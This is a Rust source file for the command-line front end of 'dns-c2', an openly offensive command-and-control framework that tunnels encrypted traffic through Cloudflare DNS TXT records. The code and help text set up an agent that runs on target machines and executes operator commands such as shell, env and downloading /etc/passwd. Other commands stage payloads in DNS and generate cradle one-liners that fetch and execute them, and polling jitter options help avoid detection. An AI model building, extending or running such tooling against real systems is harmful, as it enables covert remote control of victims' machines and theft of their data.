use dns_c2::agent;
use dns_c2::c2;
use dns_c2::cradle;
use dns_c2::crypto;
use dns_c2::dns;

use clap::{Parser, Subcommand, ValueEnum};
use log::info;
use std::path::PathBuf;

const LONG_ABOUT: &str = "\
dns-c2 — A DNS-native C2 framework.

Cloudflare is the server. DNS is the database. One binary does everything.
All C2 traffic is encrypted ChaCha20-Poly1305 TXT records on your domain.
No VPS, no redirectors, no Docker. Just a Cloudflare free tier account.

OPERATOR QUICK START (local mode, no Cloudflare needed):
  $ export C2_KEY=$(dns-c2 keygen)
  $ dns-c2 sessions -d c2.local -b local
  $ dns-c2 task -d c2.local -b local -k $C2_KEY -s <session> shell whoami

AGENT QUICK START:
  $ dns-c2 agent -d c2.local -b local -k $C2_KEY --interval 5

STAGING (cradle-based delivery):
  $ dns-c2 stage -d stg.example.com -f ./payload.sh -l loader
  $ dns-c2 cradle -s bash -d stg.example.com -l loader";

#[derive(Parser)]
#[command(
    name = "dns-c2",
    version = "0.1.0",
    about = "dns-c2 — DNS-native C2 framework",
    long_about = LONG_ABOUT,
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Clone, ValueEnum)]
enum Backend {
    /// Cloudflare DNS API
    Cloudflare,
    /// Local JSON file — no network, for development
    Local,
}

#[derive(Parser, Clone)]
struct ConnArgs {
    /// Base domain for DNS records
    #[arg(short, long)]
    domain: String,

    /// DNS backend
    #[arg(short, long, default_value = "cloudflare")]
    backend: Backend,

    /// Cloudflare API token
    #[arg(short, long, env = "C2_CF_TOKEN")]
    token: Option<String>,

    /// Cloudflare Zone ID
    #[arg(short, long, env = "C2_CF_ZONE")]
    zone: Option<String>,

    /// Local JSON store path
    #[arg(long, default_value = "./c2-records.json")]
    store_path: PathBuf,
}

#[derive(Subcommand)]
enum Commands {
    /// Run as agent on a target (agent-side)
    ///
    /// Checks in, then polls for tasks, executes them, and returns results.
    /// All communication is encrypted and goes through DNS TXT records.
    ///
    /// Example:
    ///   dns-c2 agent -d c2.example.com -k $KEY --interval 30 --jitter 0.3
    Agent {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key (hex-encoded 32 bytes)
        #[arg(short, long, env = "C2_KEY")]
        key: String,

        /// Poll interval in seconds
        #[arg(long, default_value_t = 30)]
        interval: u64,

        /// Jitter factor (0.0-1.0)
        #[arg(long, default_value_t = 0.3)]
        jitter: f64,

        /// Override auto-generated session ID
        #[arg(long)]
        session_id: Option<String>,
    },

    /// List active sessions (operator-side)
    ///
    /// Shows all agents that have checked in, with host info and last-seen time.
    ///
    /// Example:
    ///   dns-c2 sessions -d c2.example.com -k $KEY
    Sessions {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key
        #[arg(short, long, env = "C2_KEY")]
        key: String,
    },

    /// Send a task to an agent (operator-side)
    ///
    /// Sends a command and waits for the response (or use --no-wait).
    ///
    /// Available commands: shell, ls, cat, pwd, whoami, ps, env,
    ///                     download, id, hostname, netstat, exit
    ///
    /// Examples:
    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 shell whoami
    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 ls /etc
    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 download /etc/passwd
    Task {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key
        #[arg(short, long, env = "C2_KEY")]
        key: String,

        /// Target session ID
        #[arg(short, long)]
        session: String,

        /// Command to execute
        command: String,

        /// Command arguments
        args: Vec<String>,

        /// Don't wait for response
        #[arg(long, default_value_t = false)]
        no_wait: bool,

        /// Response timeout in seconds
        #[arg(long, default_value_t = 120)]
        timeout: u64,
    },

    /// Read a task response by ID (operator-side)
    ///
    /// Example:
    ///   dns-c2 result -d c2.example.com -k $KEY -s abc123 -t taskid
    Result {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key
        #[arg(short, long, env = "C2_KEY")]
        key: String,

        /// Session ID
        #[arg(short, long)]
        session: String,

        /// Task ID
        #[arg(short = 'i', long)]
        task_id: String,
    },

    /// Generate a new 256-bit encryption key
    Keygen,

    /// Stage a payload into DNS for cradle-based delivery
    ///
    /// NOTE: Staged payloads are plain base64, NOT encrypted.
    ///
    /// Example:
    ///   dns-c2 stage -d stg.example.com -f ./payload.sh -l loader
    Stage {
        #[command(flatten)]
        conn: ConnArgs,

        /// Local file to stage
        #[arg(short, long)]
        file: PathBuf,

        /// Label for the staged payload
        #[arg(short, long)]
        label: String,

        /// Payload type (auto-detected if omitted)
        #[arg(long, value_name = "TYPE")]
        r#type: Option<String>,
    },

    /// Generate a cradle one-liner to fetch and execute a staged payload
    ///
    /// Example:
    ///   dns-c2 cradle -s bash -d stg.example.com -l loader -n 1.1.1.1
    Cradle {
        #[command(flatten)]
        conn: ConnArgs,

        /// Target shell (bash, pwsh, cmd)
        #[arg(short, long)]
        shell: String,

        /// Label of the staged payload
        #[arg(short, long)]
        label: String,

        /// DNS server for the cradle to query
        #[arg(short, long)]
        ns: Option<String>,
    },

    /// Remove a staged payload from DNS
    Unstage {
        #[command(flatten)]
        conn: ConnArgs,

        /// Label to remove
        #[arg(short, long)]
        label: String,
    },
}

fn make_backend(conn: &ConnArgs) -> Box<dyn dns::DnsBackend> {
    match conn.backend {
        Backend::Cloudflare => {
            let token = conn.token.clone()
                .expect("Cloudflare backend requires --token or C2_CF_TOKEN");
            let zone = conn.zone.clone()
                .expect("Cloudflare backend requires --zone or C2_CF_ZONE");
            let retry = dns::retry::RetryBackend::with_defaults(
                Box::new(dns::cloudflare::CloudflareBackend::new(token, zone))
            );
            Box::new(retry)
        }
        Backend::Local => {
            info!("Using local backend: {:?}", conn.store_path);
            Box::new(dns::local::LocalFileBackend::new(conn.store_path.clone()))
        }
    }
}

fn main() {
    env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or("warn")
    ).init();

    let cli = Cli::parse();

    match cli.command {
        // ─── C2 Agent ───
        Commands::Agent { conn, key, interval, jitter, session_id } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let session = session_id.unwrap_or_else(c2::generate_session_id);
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            let config = agent::AgentConfig {
                domain: conn.domain,
                key: master_key,
                session_id: session.clone(),
                poll_interval_secs: interval,
                jitter_pct: jitter.clamp(0.0, 1.0),
            };

            eprintln!("dns-c2 agent | session={} interval={}s jitter={:.0}%",
                session, interval, jitter * 100.0);

            rt.block_on(async {
                if let Err(e) = agent::run(backend.as_ref(), &config).await {
                    eprintln!("Agent error: {e}");
                    std::process::exit(1);
                }
            });
        }

        // ─── List Sessions ───
        Commands::Sessions { conn, key } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            rt.block_on(async {
                match c2::list_sessions(backend.as_ref(), &conn.domain, &master_key).await {
                    Ok(sessions) => {
                        if sessions.is_empty() {
                            eprintln!("No active sessions");
                        } else {
                            eprintln!("{} session(s):\n", sessions.len());
                            for s in &sessions {
                                println!("{s}");
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("Error: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Send Task ───
        Commands::Task { conn, key, session, command, args, no_wait, timeout } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            let task_id = c2::generate_task_id();
            let task = c2::Task {
                task_id: task_id.clone(),
                command: command.clone(),
                args: args.clone(),
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH).unwrap().as_secs(),
            };

            rt.block_on(async {
                // Send task
                if let Err(e) = c2::send_task(backend.as_ref(), &conn.domain, &master_key, &session, &task).await {
                    eprintln!("Failed to send task: {e}");
                    std::process::exit(1);
                }
                eprintln!("Sent: {} {} → session {} [task={}]",
                    command, args.join(" "), session, task_id);

                if no_wait {
                    println!("task_id={task_id}");
                    return;
                }

                // Wait for response
                eprintln!("Waiting for response (timeout={}s)...", timeout);
                match c2::wait_for_response(
                    backend.as_ref(), &conn.domain, &master_key, &session, &task_id, timeout,
                ).await {
                    Ok(resp) => {
                        eprintln!("[{}] task={}", resp.status, resp.task_id);
                        println!("{}", resp.output);
                    }
                    Err(e) => {
                        eprintln!("Error: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Read Result ───
        Commands::Result { conn, key, session, task_id } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            rt.block_on(async {
                match c2::read_response(backend.as_ref(), &conn.domain, &master_key, &session, &task_id).await {
                    Ok(Some(resp)) => {
                        eprintln!("[{}] task={}", resp.status, resp.task_id);
                        println!("{}", resp.output);
                    }
                    Ok(None) => {
                        eprintln!("No response yet for task {task_id}");
                        std::process::exit(1);
                    }
                    Err(e) => {
                        eprintln!("Error: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Keygen ───
        Commands::Keygen => {
            let key = crypto::generate_key();
            println!("{}", hex::encode(key));
        }

        // ─── Stage ───
        Commands::Stage { conn, file, label, r#type } => {
            let data = std::fs::read(&file).unwrap_or_else(|e| {
                eprintln!("Failed to read {}: {e}", file.display());
                std::process::exit(1);
            });

            let payload_type = r#type.map(|t| t.parse::<cradle::PayloadType>().unwrap_or_else(|e| {
                eprintln!("Invalid type: {e}");
                std::process::exit(1);
            }));

            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            eprintln!("Staging {} ({} bytes) as '{}'...", file.display(), data.len(), label);
            rt.block_on(async {
                match cradle::stage_payload(backend.as_ref(), &conn.domain, &label, &data, payload_type).await {
                    Ok(meta) => {
                        eprintln!("Staged: {} chunks, type={}, hash={}",
                            meta.chunks, meta.payload_type, meta.hash);
                        eprintln!("\nGenerate cradles:");
                        eprintln!("  dns-c2 cradle -s bash -d {} -l {}", conn.domain, label);
                        eprintln!("  dns-c2 cradle -s pwsh -d {} -l {}", conn.domain, label);
                    }
                    Err(e) => { eprintln!("Stage failed: {e}"); std::process::exit(1); }
                }
            });
        }

        // ─── Cradle ───
        Commands::Cradle { conn, shell, label, ns } => {
            let shell_type = shell.parse::<cradle::Shell>().unwrap_or_else(|e| {
                eprintln!("{e}");
                std::process::exit(1);
            });

            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            let meta = rt.block_on(async {
                cradle::read_stage_meta(backend.as_ref(), &conn.domain, &label).await
            }).unwrap_or_else(|e| {
                eprintln!("Failed to read metadata: {e}");
                std::process::exit(1);
            });

            println!("{}", cradle::generate_cradle(shell_type, &conn.domain, &label, &meta, ns.as_deref()));
        }

        // ─── Unstage ───
        Commands::Unstage { conn, label } => {
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            rt.block_on(async {
                match cradle::unstage_payload(backend.as_ref(), &conn.domain, &label).await {
                    Ok(count) => eprintln!("Deleted {count} records"),
                    Err(e) => { eprintln!("Unstage failed: {e}"); std::process::exit(1); }
                }
            });
        }
    }
}
